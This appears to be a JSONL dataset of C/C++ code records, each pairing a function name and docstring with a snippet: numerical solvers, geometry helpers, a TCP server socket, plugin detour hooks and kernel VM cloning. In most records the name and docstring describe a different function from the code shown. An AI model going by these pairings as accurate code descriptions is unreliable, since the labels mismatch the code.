{"content":"{'function_name': 'distance', 'docstring': '\/\/Distance between (pt) and (r(0) x + r(1) y + r(2) z + r(3) = 0)', 'code': 'Vector3 normalPoint(const Vector3& pt, const VectorXd& r)\\n{\\n  \/\/Normal point of (pt) on the plane (r(0) x + r(1) y + r(2) z + r(3) = 0)\\n\\n  Vector3 a(r(0), r(1), r(2));\\n  double b=r(3);\\n\\n  return Vector3(pt - a*(dot(a,pt)+b)\/dot(a,a));\\n}'}","id":806}
{"content":"{'function_name': 'dfs', 'docstring': '\/\/get all children', 'code': 'int main() {\\n    freopen(\"input.txt\",\"r\",stdin);\\n    freopen(\"output.txt\",\"w\",stdout);\\n    Block * b[4][4];\\n    mapInitialize(b);\\n\/\/    cout << \"Initialize Complete.\" << endl;\\n    mapRead(b);\\n\/\/    cout << \"Read Complete.\" << endl;\\n    int rt[4][4]; \/\/rotation Times;\\n    for(int i=0;i<4;i++){\\n        memset(rt[i],0, sizeof(rt[i]));\\n    }\/\/ initialize\\n    \/\/dfs find the answer\\n    dfs(b,rt,0,0);\\n    outputAns(rt);\\n\/\/    cout << \"DFS Ans:\" <<endl;\\n\/\/    for(int i=0;i<4;i++){\\n\/\/        for(int j=0;j<4;j++){\\n\/\/            cout << rt[i][j] << \" \" ;\\n\/\/        }\\n\/\/        cout << endl;\\n\/\/    }\\n\/\/    cout << \"DFS Complete.\" << endl;\\n\/\/    std::cout << \"Hello, World!\" << std::endl;\\n    return 0;\\n}'}","id":813}
{"content":"{'function_name': 'mutateSolution', 'docstring': '\/\/ Update the fitness if possible', 'code': 'double AM( int choosen, int MAX_EVALUATIONS, int mem_type) {\\n  int evaluations = 0, tam_pob = 50, generations = 0, max_iterations = 400;\\n  double mut_prob = 0.001, cross_prob = 0.7, p_mem = 0.1;\\n  clock_t t_start, t_total;\\n  population new_pop, pop;\\n\\n  \/\/ set seed\\n  srand (time(NULL));\\n  t_start = clock();\\n\\n  initializePop(pop, tam_pob, choosen);\\n  evaluatePop(pop, evaluations);\\n\\n  while (evaluations < MAX_EVALUATIONS) {\\n    generations++;\\n    selection(pop, new_pop);\\n    cross(new_pop, cross_prob);\\n    mutatePop(new_pop, mut_prob, choosen, evaluations);\\n    evaluatePop(new_pop, evaluations);\\n    replace(pop, new_pop);\\n    if (generations % 10 == 0) {\\n      memetize(pop, mem_type, max_iterations, evaluations, p_mem);\\n    }\\n\\n    \/\/ Experimento 3\\n    cout << generations << \"\\\\t\" << pop.max_fitness << endl;\\n  }\\n  t_total = clock() - t_start;\\n\\n  solution sol = pop.v[ pop.best_sol ];\\n\\n  \/\/ output: Fitness - Time - Iterations\\n  \/\/ cout << sol.fitness << \"\\\\t\" << (double) t_total \/ CLOCKS_PER_SEC << \"\\\\t\" << generations << endl;\\n  return sol.fitness;\\n}'}","id":814}
{"content":"{'function_name': 'main', 'docstring': '\/\/ const  int e = 92;', 'code': 'int main()\\n{\\n    int i;\\n   int sum {0};\\n    \/\/int sum {1};\\n    for (i=1;i<=15;++i){\\n        \/\/cout<<i<<endl;\\n        if ( i%2 != 0){\\n            \/\/i=sum;\\n            sum+=i;\\n            cout<<sum<<\"\\\\n\";\\n        }\\n    }\\n    return 0;\\n}'}","id":815}
{"content":"{'function_name': 'solveSmall', 'docstring': '\/\/ we are only rotating on the X axis', 'code': \"double areaLarge(Obj &o) {\\n  \/\/ use vertices 0 and 1's x coordinate times sqrt(2)\\n  \/\/ for the center rectangle\\n  double rect = sqrt(2) * abs(o.v[0].x - o.v[1].x);\\n  double triangles = sqrt(2) * abs(o.v[5].x - o.v[2].x);\\n  return rect+triangles;\\n}\"}","id":818}
{"content":"{'function_name': 'replaceNaNs', 'docstring': '\/\/\/typedef cv::Vec3f mt;', 'code': 'float distPointToPlane (cv::Point3f point, cv::Point3f normal) {\\n\\n        float sn, sd, sb;\\n        sn = -normal.dot(point);\\n        \/\/sd = normal.dot(normal);\\n        \/\/sb = sn\/sb;\\n\\n        \/\/std::cout << \"sn, sd, sb: \" << sn << \", \" << sd << \", \" << sb << endl;\\n        \/*\\n        sn = -dot( PL.n, (P - PL.V0));\\n        sd = dot(PL.n, PL.n);\\n        sb = sn \/ sd;\\n        *\/\\n\\n        return sn;\\n}'}","id":822}
{"content":"{'function_name': 'cartToJoint', 'docstring': '\/\/this funtion basically shortens down the inverse kin process for the purpose of trajectory planning\\r', 'code': 'double quickTraj(JOINT &joint1,JOINT &joint2,JOINT &joint3,JOINT &finaljoint){\\r\\n\\r\\n\\t\/\/change as desired!\\r\\n\\tjoint1[0] =0;\\r\\n\\tjoint1[1] =0;\\r\\n    joint1[2] =-175;\\r\\n\\tjoint1[3] =0;\\r\\n\\r\\n\\tjoint2[0] =0;\\r\\n\\tjoint2[1] =0;\\r\\n\\tjoint2[2] =-175;\\r\\n\\tjoint2[3] =0;\\r\\n\\r\\n\\tjoint3[0] =0;\\r\\n\\tjoint3[1] =0;\\r\\n\\tjoint3[2] =-175;\\r\\n\\tjoint3[3] =0;\\r\\n\\r\\n\\tfinaljoint[0] =0;\\r\\n\\tfinaljoint[1] =0;\\r\\n\\tfinaljoint[2] =-175;\\r\\n\\tfinaljoint[3] =0;\\r\\n\\r\\n\\t\/\/1 seconds\\r\\n\\treturn 1*1000;\\r\\n}'}","id":824}
{"content":"{'function_name': 'parareal', 'docstring': '\/\/end of parallel region', 'code': 'int main(){\\n  double T = 10; \/\/ terminal time\\n  double ratio = 1e5; \/\/ratio of course to fine\\n  double dt_coarse = 1; \/\/coarse time step\\n  double dt_fine = dt_coarse\/ratio; \/\/ fine time step\\n  long N = 100;\\n  long K = 1; \/\/number of parareal iterations\\n\\n  long N_coarse = round(T\/dt_coarse); \/\/number of coarse time steps\\n\\n  \/\/timeVec is the vector of times to get solution at\\n  double *timeVec = (double*) malloc((N_coarse+1) * sizeof(double));\\n  for(long s=0; s<= N_coarse; s++) timeVec[s] = (double)s*dt_coarse;\\n\\n  \/\/ where I save the solution using the coarse solver and the fine solver\\n  double* u_coarse = (double*) malloc(N*(N_coarse+1) * sizeof(double));\\n  double* u_fine = (double*) malloc(N*(N_coarse+1) * sizeof(double));\\n  double* u_PR = (double*) malloc(N*(N_coarse+1) * sizeof(double));\\n  double* u_PR_copy = (double*) malloc(N*(N_coarse+1) * sizeof(double));\\n  double* truth = (double*) malloc(N*(N_coarse+1) * sizeof(double));\\n  for (long s=0; s< N*(N_coarse+1); s++){\\n    u_fine[s] = 0;\\n    u_coarse[s] = 0;\\n    truth[s] = 0;\\n  }\\n\\n  \/\/ allocate buffers for the solver\\n  double* coarse_righthand_buff = (double*) malloc(N*sizeof(double));\\n  double* coarse_FPsoln_buff = (double*) malloc(N*sizeof(double));\\n  double* coarse_FPrighthand_buff = (double*) malloc(N*sizeof(double));\\n  double* fine_righthand_buff = (double*) malloc(N*sizeof(double));\\n  double* fine_FPsoln_buff = (double*) malloc(N*sizeof(double));\\n  double* fine_FPrighthand_buff = (double*) malloc(N*sizeof(double));\\n  for (long n=0; n<N; n++){ \/\/initialize all buffers\\n    u_coarse[n] = 1.\/((double)n+1);\\n    u_fine[n] = 1.\/((double)n+1);\\n    coarse_righthand_buff[n] = 0;\\n    fine_righthand_buff[n] = 0;\\n    coarse_FPsoln_buff[n] = u_coarse[n];\\n    fine_FPsoln_buff[n] = u_fine[n];\\n    coarse_FPrighthand_buff[n] = 0;\\n    fine_FPrighthand_buff[n] = 0;\\n  }\\n\\n  \/\/ solve for a -sin RHS and set initial conditions\\n  void (*myRHS) (double*,double,double*,long) = sinRHS;\\n\\n  \/\/get truth\\n  for (long j=0; j<= N_coarse; j++){\\n    for (long n=0; n<N; n++){\\n      \/\/ truth[n+j*N] = (cos((double)(n+1)*j*dt_coarse) \/ ((double)n+1));\\n      truth[n+j*N] = (cos((double)(n+1)*j*dt_coarse) \/ ((double)n+1)) + sqrt(n+1.)*j*dt_coarse;\\n    }\\n  }\\n\\n  \/\/ printf(\"IC is [%f,%f]\\\\n\",u_fine[0],u_fine[1]);\\n  \/\/ printf(\"init truth is [%f,%f]\\\\n\",truth[0],truth[1]);\\n\\n  printf(\"\\\\n\");\\n  \/******************************************************************\\n  **************************** Coarse BE ****************************\\n  ******************************************************************\/\\n  printf(\"********** Coarse Solver (dt=%2.1E) **********\\\\n\",dt_coarse);\\n  \/\/time coarse solve\\n  double timer_coarse = omp_get_wtime();\\n  for (long s=0; s< N_coarse; s++){\\n    backEuler(myRHS,timeVec[s+1],timeVec[s],dt_coarse,u_coarse+((s+1)*N),\\n              coarse_righthand_buff,coarse_FPsoln_buff,coarse_FPrighthand_buff,N);\\n  }\\n  timer_coarse = omp_get_wtime() - timer_coarse;\\n\\n  \/\/compute coarse solve error;\\n  double coarse_err = 0;\\n  for(long s=0; s < N*(N_coarse+1); s++){\\n    coarse_err = fmax(std::abs(truth[s] - u_coarse[s]), coarse_err);\\n  }\\n  \/\/printf(\"coarse solve using dt=%2.2e took: %f s\\\\n\",dt_coarse,timer_coarse);\\n  \/\/printf(\"max coarse solver error is: %6.4e \\\\n\", coarse_err);\\n  \/\/printf(\"coarse solver (dt=%2.1E) time: %f s\\\\n\",dt_coarse,timer_coarse);\\n  printf(\"coarse solver time: %f s\\\\n\",timer_coarse);\\n  printf(\"coarse solver error: %6.4E \\\\n\", coarse_err);\\n  printf(\"\\\\n\");\\n\\n  \/****************************************************************\\n  **************************** Fine BE ****************************\\n  ****************************************************************\/\\n  printf(\"********** Fine Solver (dt=%2.1E) **********\\\\n\",dt_fine);\\n  \/\/time fine solve\\n  double timer_fine = omp_get_wtime();\\n  for (long s=0; s< N_coarse; s++){\\n    backEuler(myRHS,timeVec[s+1],timeVec[s],dt_fine,u_fine+((s+1)*N),\\n              fine_righthand_buff,fine_FPsoln_buff,fine_FPrighthand_buff,N);\\n  }\\n  timer_fine = omp_get_wtime() - timer_fine;\\n\\n  \/\/compute fine solve error\\n  double fine_err = 0;\\n  for(long s=0; s < N*(N_coarse+1); s++){\\n    fine_err = fmax(std::abs(truth[s] - u_fine[s]), fine_err);\\n  }\\n\\n  \/\/printf(\"fine solve using dt=%2.2e took: %f s\\\\n\",dt_fine,timer_fine);\\n  \/\/printf(\"max fine solver error is: %6.4e \\\\n\", fine_err);\\n  \/\/printf(\"fine solver (dt=%2.1E) time: %f s\\\\n\",dt_fine,timer_fine);\\n  printf(\"fine solver time: %f s\\\\n\",timer_fine);\\n  printf(\"fine solver error: %6.4E \\\\n\", fine_err);\\n  printf(\"\\\\n\");\\n\\n  \/*****************************************************************\\n  **************************** Parareal ****************************\\n  *****************************************************************\/\\n  printf(\"********** Parareal (%d threads) **********\\\\n\",N_THREADS);\\n  \/\/set up parareal\\n  for (long s=0; s< N*(N_coarse+1); s++){\\n    u_PR[s] = u_coarse[s]; \/\/copy coarse\\n    u_PR_copy[s] = u_coarse[s];\\n  }\\n\\n  \/\/time parareal solve\\n  double timer_parareal = omp_get_wtime();\\n  parareal(myRHS,u_PR,u_PR_copy,timeVec,N_coarse,dt_fine,dt_coarse,K,N);\\n  timer_parareal = omp_get_wtime() - timer_parareal;\\n\\n\\n  \/\/compute parareal error\\n  double parareal_err = 0;\\n  for(long s=0; s < N*(N_coarse+1); s++){\\n    parareal_err = fmax(std::abs(truth[s] - u_PR[s]), parareal_err);\\n    \/\/printf(\"error is: %f\\\\n\",std::abs(truth[s] - u_PR[s]));\\n    \/\/printf(\"PR solution is: %f\\\\n\",u_PR[s]);\\n  }\\n\\n  printf(\"PR %d iterations time: %f s\\\\n\",K,timer_parareal);\\n  printf(\"PR error: %6.4E \\\\n\", parareal_err);\\n\\n  \/\/compute difference of parareal from fine solve\\n  double parareal_fine_diff = 0;\\n  for(long s=0; s < N*(N_coarse+1); s++){\\n    parareal_fine_diff = fmax(std::abs(u_fine[s] - u_PR[s]), parareal_fine_diff);\\n  }\\n  \/\/ printf(\"max parareal and fine solver difference is: %6.4e \\\\n\", parareal_fine_diff);\\n  printf(\"max PR and fine solver difference: %6.4E \\\\n\", parareal_fine_diff);\\n\\n  \/\/measure speedup and efficiency\\n  double speedup = timer_fine \/ timer_parareal;\\n  double ideal_speedup = N_THREADS\/(double)K;\\n  double efficiency = speedup \/ ideal_speedup;\\n\\n  \/\/printf(\"speedup is %f, efficiency is %f\\\\n\",speedup,efficiency);\\n  printf(\"speedup: %f\\\\n\",speedup);\\n  printf(\"efficiency: %f\\\\n\",efficiency);\\n  printf(\"\\\\n\");\\n\\n  \/\/solve and time\\n  \/\/ double t_timer = omp_get_wtime();\\n  \/\/ u_fine = backEuler(myRHS,T,0,dt\/M,1);\\n  \/\/ t_timer = omp_get_wtime() - t_timer;\\n  \/\/ printf(\"error at terminal time T=%6.2f is %6.3e\\\\n\",T,std::abs(truth-u));\\n  \/\/ printf(\"time elapse: %f s\\\\n\",t_timer);\\n  \/\/ printf(\"Final solution is u=%f and T=%f\\\\n\",u,T);\\n\\n  free(timeVec);\\n  free(u_coarse);\\n  free(u_fine);\\n  free(u_PR);\\n  free(u_PR_copy);\\n  free(truth);\\n\\n  return 0;\\n}'}","id":825}
{"content":"{'function_name': 'establish_tcp_connection', 'docstring': '\/\/Connecting to the Server', 'code': 'int server_socket_non_blocking(int port, char* hostName)\\n{\\n        \/\/hostAddr to socket details\\n        struct sockaddr_in hostAddr;\\n\\n        \/\/SOCKET OPTIONS for LINGER\\n        struct linger linger;\\n        memset(&linger,0,sizeof(linger));\\n        linger.l_onoff = 1;\\n        linger.l_linger = 0;\\n\\n        \/\/file descriptor for socket\\n        int socket_fd;\\n\\n\\n        \/\/create TCP Server Socket\\n        if((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)\\n        {\\n                error_handler(\"Error while creating TCP Server Socket: Socket()\");\\n        }\\n\\n        \/\/Set the FLAGs for SERVER SOCKET\\n        int arg = 1;\\n        if(setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)\\n        {\\n                error_handler(\"Failed while setting SOCKET Options: SOC_REUSEADDR\");\\n        }\\n\\n        \/\/Set SOCKET OPTION LINGER\\n        if(setsockopt(socket_fd, SOL_SOCKET, SO_LINGER,(char*)&linger, sizeof(linger)) == -1)\\n        {\\n                error_handler(\"Failed while setting SOCKET Options: SO_LINGER\");\\n        }\\n\\n        \/\/Configure NON Blocking\\n        if (fcntl (socket_fd, F_SETFL, O_NONBLOCK | fcntl (socket_fd, F_GETFL, 0)) == -1)\\n        {\\n                error_handler(\"FCTL: while setting SERVER SOCKET NON Blocking\");\\n        }\\n\\n        \/\/bind server socket to port\\n        memset(&hostAddr,0,sizeof(struct sockaddr_in));\\n        hostAddr.sin_family = AF_INET;\\n        hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);\\n        hostAddr.sin_port = htons(port);\\n\\n        if(bind(socket_fd, (struct sockaddr*) &hostAddr, sizeof(hostAddr)) == -1)\\n        {\\n                error_handler(\"Error while binding Server Socket: BIND\");\\n        }\\n\\n        \/\/Start Listening\\n        if(listen(socket_fd,LISTENER_QUEUE) == -1)\\n        {\\n                error_handler(\"Error while Listening on Server Socket: LISTEN\");\\n        }\\n\\n        return socket_fd;\\n\\n}'}","id":826}
{"content":"{'function_name': 'AddDetourPluginHook', 'docstring': '\/\/ Add the plugin callback to the detour list.\\r', 'code': \"bool RemoveDetourPluginHook(HookType_t hookType, CHook *pDetour, IPluginFunction *pCallback)\\r\\n{\\r\\n\\tDetourMap *map;\\r\\n\\tif (hookType == HOOKTYPE_PRE)\\r\\n\\t\\tmap = &g_pPreDetours;\\r\\n\\telse\\r\\n\\t\\tmap = &g_pPostDetours;\\r\\n\\r\\n\\tDetourMap::Result res = map->find(pDetour);\\r\\n\\tif (!res.found())\\r\\n\\t\\treturn false;\\r\\n\\r\\n\\t\/\/ Remove the plugin's callback\\r\\n\\tbool bRemoved = false;\\r\\n\\tPluginCallbackList *wrappers = res->value;\\r\\n\\tfor (int i = wrappers->size()-1; i >= 0 ; i--)\\r\\n\\t{\\r\\n\\t\\tCDynamicHooksSourcePawn *pWrapper = wrappers->at(i);\\r\\n\\t\\tif (pWrapper->plugin_callback == pCallback)\\r\\n\\t\\t{\\r\\n\\t\\t\\tbRemoved = true;\\r\\n\\t\\t\\tdelete pWrapper;\\r\\n\\t\\t\\twrappers->erase(wrappers->begin() + i);\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ No more plugin hooks on this callback. Free our structures.\\r\\n\\tif (wrappers->empty())\\r\\n\\t{\\r\\n\\t\\tdelete wrappers;\\r\\n\\t\\tUnhookFunction(hookType, pDetour);\\r\\n\\t\\tmap->remove(res);\\r\\n\\t}\\r\\n\\r\\n\\treturn bRemoved;\\r\\n}\"}","id":827}
{"content":"{'function_name': 'checkRecord', 'docstring': '\/\/\u53ea\u6709\u4e00\u4e2aA', 'code': 'int checkRecord2(int n) {\\n    \/\/\u540c\u6837\u9012\u5f52\uff1adp[i]\u8868\u793a\u957f\u5ea6\u4e3ai\uff0c\u53ef\u5956\u52b1\u5e8f\u5217\u7684\u4e2a\u6570\uff08\u53ea\u5305\u542bP\u548cL\uff09\uff0c\u90a3\u4e48dp[i]=2dp[i-1]-dp[i-4]\\n    \/\/\u5982\u4f55\u5f97\u6765\u7684\uff1f\u8fd8\u662f\u4e0a\u9762\u7684\u601d\u8def\uff0c\u53ea\u6709LLL\u662f\u4e0d\u884c\u7684,dp[i-1]\u540e\u6709\u4e24\u79cd\u9009\u62e9\uff0c\u7b2ci\u4e3a\u653ep\u7684\u8bdd\uff0c\u5219\u80af\u5b9a\u80fd\u5956\u52b1\uff0c\u653eL\u5219\u9700\u8981\u770b\u524d\u65b9\u662f\u5426\u662fLL\uff0c\u800c\u4ee5LL\u7ed3\u675f\u7684\u53ef\u5956\u52b1\u5e8f\u5217\u6709dp[i-4]\u79cd\uff0c\\n    \/\/\u6240\u4ee5\u5f97\u5230\u5f97\u5230\uff1adp[i]=2dp[i]-dp[i-4]\\n\\n    const int cLimit = 1000000007;\\n\\n    vector<int> f(n+1,0);\\n    f[0]=1;\\n    for(int i=1;i<=n;++i)\\n    {\\n        f[i] = RecFun(i); \/\/\u5f88\u660e\u663e\uff0crecfun\u9700\u8981\u52a8\u5f52\u4f18\u5316\\n    }\\n\\n    int sum = RecFun(n);\\n    for(int i=1;i<=n;++i)\\n    {\\n        sum += (f[i-1]*f[n-i]) % cLimit;\\n    }\\n\\n    return sum % cLimit;\\n}'}","id":829}
{"content":"{'function_name': 'sToDouble', 'docstring': '\/\/busca al separador y el comienzo de los caracteres sacando el cero\\r', 'code': 'AnsiString CalculoHora(AnsiString sTimeTicksi, unsigned int nTT0, double nTime0)\\r\\n{\\r\\n    if (sTimeTicksi == \"\" || sTimeTicksi == \"0\") return \"0\";\\r\\n\\r\\n    AnsiString sFormatoHora = \"hh:nn:ss\";\\r\\n\\r\\n    if (nTT0 == 0 || nTime0==0) return \"\";\\r\\n\\r\\n    double nAux, nDeltaTT;\\r\\n\\r\\n    \/\/diferencia entre timeticks inicio y actual\\r\\n    nDeltaTT =  abs(sTimeTicksi.ToDouble() - nTT0);\\r\\n\\r\\n\\r\\n    AnsiString sTimei, sTime;\\r\\n\\r\\n    nAux = nDeltaTT;\\r\\n    double nDias, nHoras, nSeg;\\r\\n\\r\\n    nAux = nAux \/ 100;\\r\\n    nAux = (nAux \/ 60) \/ 60;\\r\\n    nAux = nAux \/ 24;\\r\\n    nDias = (int) nAux;\\r\\n    nAux = nAux - nDias;\\r\\n\\r\\n    \/\/diferencia en TDateTime de la hora inicial y final\\r\\n    sTimei = AnsiString(nAux);\\r\\n    sTimei = AnsiString(nDias) + DecimalSeparator + sTimei.SubString(3,sTimei.Length()-3);\\r\\n\\r\\n    \/\/agrego la hora inicial\\r\\n    TDateTime dtH1;\\r\\n    if (nTT0 > sTimeTicksi.ToDouble()){\\r\\n        dtH1 = Now() - sTimei.ToDouble();\\r\\n    }\\r\\n    else\\r\\n        dtH1 = sTimei.ToDouble() + nTime0;\\r\\n\\r\\n    sTime = FormatDateTime(sFormatoHora, dtH1);\\r\\n    return sTime;\\r\\n\\r\\n}'}","id":834}
{"content":"{'function_name': 'get_world_annotation_ID', 'docstring': '\/\/      cout << \"annotation_ID = \"  << annotation_ID << endl;', 'code': 'void get_all_world_map_annotations(\\n      gis_database* gis_database_ptr,int fieldtest_ID,\\n      vector<int>& annotation_IDs,vector<string>& creation_times,\\n      vector<string>& event_times,vector<string>& usernames,\\n      vector<string>& labels,vector<string>& descriptions,\\n      vector<string>& colors,vector<int>& importances,\\n      vector<threevector>& llas)\\n   {\\n\/\/      cout << \"inside databasefunc::get_all_world_map_annotations()\" << endl;\\n\/\/      cout << \"fieldtest_ID = \" << fieldtest_ID << endl;\\n\\n      string SQL_command=\"SELECT id,creation_time,event_time,username,\";\\n      SQL_command += \"label,description,color,importance,z_posn,\";\\n      SQL_command += \"x(xy_posn),y(xy_posn) from world_annotations \";\\n      SQL_command += \"WHERE fieldtest_ID=\"+stringfunc::number_to_string(\\n         fieldtest_ID)+\";\";\\n\/\/      cout << \"SQL_command = \" << SQL_command << endl;\\n\\n      Genarray<string>* field_array_ptr=\\n         gis_database_ptr->select_data(SQL_command);\\n      if (field_array_ptr==NULL) return;\\n\\n      unsigned int mdim=field_array_ptr->get_mdim();\\n\/\/      unsigned int ndim=field_array_ptr->get_ndim();\\n\/\/      cout << \"mdim = \" << mdim << \" ndim = \" << ndim << endl;\\n\\n      for (unsigned int i=0; i<mdim; i++)\\n      {\\n         annotation_IDs.push_back(stringfunc::string_to_number(\\n            field_array_ptr->get(i,0)));\\n         creation_times.push_back(field_array_ptr->get(i,1));\\n         event_times.push_back(field_array_ptr->get(i,2));\\n         usernames.push_back(field_array_ptr->get(i,3));\\n         labels.push_back(field_array_ptr->get(i,4));\\n         descriptions.push_back(field_array_ptr->get(i,5));\\n         colors.push_back(field_array_ptr->get(i,6));\\n         importances.push_back(stringfunc::string_to_number(\\n            field_array_ptr->get(i,7)));\\n         double altitude=stringfunc::string_to_number(\\n            field_array_ptr->get(i,8));\\n         double longitude=stringfunc::string_to_number(\\n            field_array_ptr->get(i,9));\\n         double latitude=stringfunc::string_to_number(\\n            field_array_ptr->get(i,10));\\n         llas.push_back(threevector(longitude,latitude,altitude));\\n\\n         cout << \"annotation_ID = \"  << annotation_IDs.back() << endl;\\n         cout << \"creation_time = \" << creation_times.back() << endl;\\n         cout << \"event_time = \" << event_times.back() << endl;\\n         cout << \"username = \" << usernames.back() << endl;\\n         cout << \"label = \" << labels.back() << endl;\\n         cout << \"description = \" << descriptions.back() << endl;\\n         cout << \"color = \" << colors.back() << endl;\\n         cout << \"importance = \" << importances.back() << endl;\\n         cout << \"lon = \" << longitude << \" lat = \" << latitude\\n              << \" alt = \" << altitude << endl;\\n      } \/\/ loop over index i labeling world annotations\\n   }'}","id":839}
{"content":"{'function_name': 'nextPos', 'docstring': '\/\/ whether position was set', 'code': 'char command(int& pos1, int& pos2, string& text, CircDoublyList<string>* doubly)\\n{\\n    string input;\\n    do\\n    {\\n        cout<<\" >> \";\\n        getline(cin,input);\\n    }\\n    while (!parseInput(doubly, input, pos1, pos2, text));\\n    return toupper(input[0]); \/\/ return it as char\\n}'}","id":843}
{"content":"{'function_name': 'LatToInt', 'docstring': '\/\/       000111111222222...LLLLLMMMM', 'code': 'double LonIn180180(double lon)\\n{\\n  if (lon >= 0)\\n    return fmod(lon + 180.0, 360.0) - 180.0;\\n\\n  \/\/ Handle the case of l = -180\\n  double const l = fmod(lon - 180.0, 360.0) + 180.0;\\n  return l < 180.0 ? l : l - 360.0;\\n}'}","id":850}
{"content":"{'function_name': 'lrint', 'docstring': '\/\/ Note: long int may be 32 or 64 bits.', 'code': 'static\\nlong int lrintf(float x) {\\n    \/\/ Note: long int may be 32 or 64 bits.\\n    return cast_IEEE754<long int>(x);\\n}'}","id":856}
{"content":"{'function_name': 'vmspace_clone_area_must_copy', 'docstring': '\/* Scenario (2) does copy MD-specific parts *\/', 'code': 'errorcode_t\\nvmspace_clone(vmspace_t* vs_source, vmspace_t* vs_dest, int flags)\\n{\\n\\tTRACE(VM, INFO, \"vmspace_clone(): source=%p dest=%p flags=%x\", vs_source, vs_dest, flags);\\n\\n\\t\/*\\n\\t * First, clean up the destination area\\'s mappings - this ensures we\\'ll\\n\\t * overwrite them with our own. Note that we\\'ll leave private mappings alone.\\n\\t *\/\\n\\tLIST_FOREACH_SAFE(&vs_dest->vs_areas, va, vmarea_t) {\\n\\t\\tif (!vmspace_clone_area_must_free(va, flags))\\n\\t\\t\\tcontinue;\\n\\t\\tvmspace_area_free(vs_dest, va);\\n\\t}\\n\\n\\t\/* Now copy everything over that isn\\'t private *\/\\n\\tLIST_FOREACH(&vs_source->vs_areas, va_src, vmarea_t) {\\n\\t\\tif (!vmspace_clone_area_must_copy(va_src, flags))\\n\\t\\t\\tcontinue;\\n\\n\\t\\tvmarea_t* va_dst;\\n\\t\\terrorcode_t err = vmspace_mapto(vs_dest, va_src->va_virt, va_src->va_len, va_src->va_flags, &va_dst);\\n\\t\\tANANAS_ERROR_RETURN(err);\\n\\t\\tif (va_src->va_dentry != nullptr) {\\n\\t\\t\\t\/\/ Backed by an inode; copy the necessary fields over\\n\\t\\t\\tva_dst->va_doffset = va_src->va_doffset;\\n\\t\\t\\tva_dst->va_dlength = va_src->va_dlength;\\n\\t\\t\\tva_dst->va_dentry = va_src->va_dentry;\\n\\t\\t\\tdentry_ref(va_dst->va_dentry);\\n\\t\\t}\\n\\n\\t\\t\/\/ Copy the area page-wise\\n\\t\\tLIST_FOREACH(&va_src->va_pages, vp, struct VM_PAGE) {\\n\\t\\t\\tvmpage_lock(vp);\\n\\t\\t\\tKASSERT(vmpage_get_page(vp)->p_order == 0, \"unexpected %d order page here\", vmpage_get_page(vp)->p_order);\\n\\n\\t\\t\\t\/\/ Create a clone of the data; it is up to the vmpage how to do this (it may go for COW)\\n\\t\\t\\tstruct VM_PAGE* new_vp = vmpage_clone(vs_source, va_src, va_dst, vp);\\n\\n\\t\\t\\t\/\/ Map the page into the cloned vmspace\\n\\t\\t\\tvmpage_map(vs_dest, va_dst, new_vp);\\n\\t\\t\\tvmpage_unlock(new_vp);\\n\\t\\t\\tvmpage_unlock(vp);\\n\\t\\t}\\n\\t}\\n\\n\\t\/*\\n\\t * See where the next mapping can be placed; we should use something more\\n\\t * clever than vs_next_mapping someday but this will have to suffice for\\n\\t * now.\\n\\t *\/\\n\\tvs_dest->vs_next_mapping = 0;\\n\\tLIST_FOREACH(&vs_dest->vs_areas, va, vmarea_t) {\\n\\t\\taddr_t next = RoundUp(va->va_virt + va->va_len);\\n\\t\\tif (vs_dest->vs_next_mapping < next)\\n\\t\\t\\tvs_dest->vs_next_mapping = next;\\n\\t}\\n\\n\\treturn ananas_success();\\n}'}","id":859}
{"content":"{'function_name': 'compute_firmware_page_number', 'docstring': '\/*******************************\\n    * [ELAN Firmware Page]\\n    * Address:    1 Word (= 2 Byte)\\n    * Page Data: 64 Word\\n    * Checksum:   1 Word\\n    * ------------------------------\\n    * Total: 1 + 64 + 1 = 66 Word\\n    *                   = 132 Byte\\n    *******************************\/', 'code': 'int retrieve_data_from_firmware(unsigned char *data, int data_size)\\n{\\n    int err = TP_SUCCESS,\\n        read_byte = 0;\\n\\n    \/\/ Make Sure Page Data Buffer Valid\\n    if(data == NULL)\\n    {\\n        ERROR_PRINTF(\"%s: NULL Page Data Buffer!\\\\r\\\\n\", __func__);\\n        err = TP_ERR_INVALID_PARAM;\\n        goto RETRIEVE_DATA_FROM_FIRMWARE_EXIT;\\n    }\\n\\n    \/\/ Make Sure Page Data Buffer Size Valid\\n    if(data_size == 0)\\n    {\\n        ERROR_PRINTF(\"%s: Data Buffer Size is Zero!\\\\r\\\\n\", __func__);\\n        err = TP_ERR_INVALID_PARAM;\\n        goto RETRIEVE_DATA_FROM_FIRMWARE_EXIT;\\n    }\\n\\n    \/\/ Read Data from File\\n    read_byte = read(g_firmware_fd, data, data_size);\\n    if(read_byte != data_size)\\n    {\\n        ERROR_PRINTF(\"%s: Fail to get %d bytes from fd %d! (read_byte=%d, errno=%d)\\\\r\\\\n\", __func__, data_size, g_firmware_fd, read_byte, errno);\\n        err = TP_GET_DATA_FAIL;\\n    }\\n\\n    \/\/ Success\\n    err = TP_SUCCESS;\\n\\nRETRIEVE_DATA_FROM_FIRMWARE_EXIT:\\n    return err;\\n}'}","id":865}
{"content":"{'function_name': 'round_nearest_tie_even', 'docstring': '\/\/ shift digits into position', 'code': \"fastfloat_really_inline bool is_truncated(const char* first, const char* last) noexcept {\\n  \/\/ do 8-bit optimizations, can just compare to 8 literal 0s.\\n  uint64_t val;\\n  while (std::distance(first, last) >= 8) {\\n    ::memcpy(&val, first, sizeof(uint64_t));\\n    if (val != 0x3030303030303030) {\\n      return true;\\n    }\\n    first += 8;\\n  }\\n  while (first != last) {\\n    if (*first != '0') {\\n      return true;\\n    }\\n    first++;\\n  }\\n  return false;\\n}\"}","id":871}
